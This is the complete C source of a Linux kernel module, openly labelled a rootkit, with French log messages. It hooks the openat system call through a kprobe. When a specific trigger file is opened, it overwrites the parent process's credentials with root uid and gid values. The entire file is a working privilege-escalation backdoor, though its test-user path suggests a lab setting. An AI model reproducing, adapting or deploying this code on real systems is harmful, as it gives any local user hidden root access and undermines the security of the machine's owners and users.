#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/cred.h>
#include <linux/uaccess.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nathan, FL");
MODULE_DESCRIPTION("Rootkit - PrivEsc via openat sur un fichier spécifique");
MODULE_VERSION("0.3");

static struct kprobe kp;

#define TRIGGER_FILE "/home/testuser/root_trigger_write"

static void set_root(void)
{
    struct cred *new_creds;
    struct task_struct *parent_task;

    parent_task = current->real_parent;

    new_creds = prepare_creds();
    if (new_creds == NULL) {
        printk(KERN_ALERT "rootkit: Unable to prepare credentials.\n");
        return;
    }

    new_creds->uid.val = 0;
    new_creds->gid.val = 0;
    new_creds->euid.val = 0;
    new_creds->egid.val = 0;
    new_creds->suid.val = 0;
    new_creds->sgid.val = 0;
    new_creds->fsuid.val = 0;
    new_creds->fsgid.val = 0;

    if (parent_task) {
        task_lock(parent_task); 
        parent_task->real_cred = new_creds;
        parent_task->cred = new_creds;
        task_unlock(parent_task); 
    } else {
        printk(KERN_ALERT "rootkit: Parent task not found.\n");
    }

    printk(KERN_INFO "rootkit: Parent process privileges escalated successfully.\n");
}

static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    char __user *filename_user;
    char filename[256] = {0};
    int ret;

    printk(KERN_INFO "rootkit: handler_pre activé\n");

    filename_user = (char __user *)regs->si; 
    printk(KERN_INFO "rootkit: Adresse utilisateur du fichier : %px\n", filename_user);

    ret = copy_from_user(filename, filename_user, sizeof(filename) - 1);
    if (ret) {
        printk(KERN_ERR "rootkit: Échec de la copie depuis l'espace utilisateur (%d octets non copiés)\n", ret);
        return 0;
    }
    filename[sizeof(filename) - 1] = '\0'; 
    printk(KERN_INFO "rootkit: Fichier ouvert : %s\n", filename);

    if (strcmp(filename, TRIGGER_FILE) == 0) {
        printk(KERN_INFO "rootkit: Fichier déclencheur détecté : %s\n", filename);
        set_root();
    } else {
        printk(KERN_INFO "rootkit: Fichier non pertinent : %s\n", filename);
    }

    return 0; 
}

static void handler_post(struct kprobe *p, struct pt_regs *regs, unsigned long flags)
{
    printk(KERN_INFO "rootkit: Fin de l'appel openat, valeur de retour : %ld\n", regs->ax);
}

static int __init rootkit_init(void)
{
    int ret;

    printk(KERN_INFO "rootkit: Initialisation\n");

    kp.symbol_name = "__x64_sys_openat";
    kp.pre_handler = handler_pre;
    kp.post_handler = handler_post;

    ret = register_kprobe(&kp);
    if (ret < 0) {
        printk(KERN_ERR "rootkit: Échec d'enregistrement du kprobe, code %d\n", ret);
        return ret;
    }

    printk(KERN_INFO "rootkit: Kprobe enregistré sur %s\n", kp.symbol_name);
    return 0;
}

static void __exit rootkit_exit(void)
{
    unregister_kprobe(&kp);
    printk(KERN_INFO "rootkit: Kprobe supprimé\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);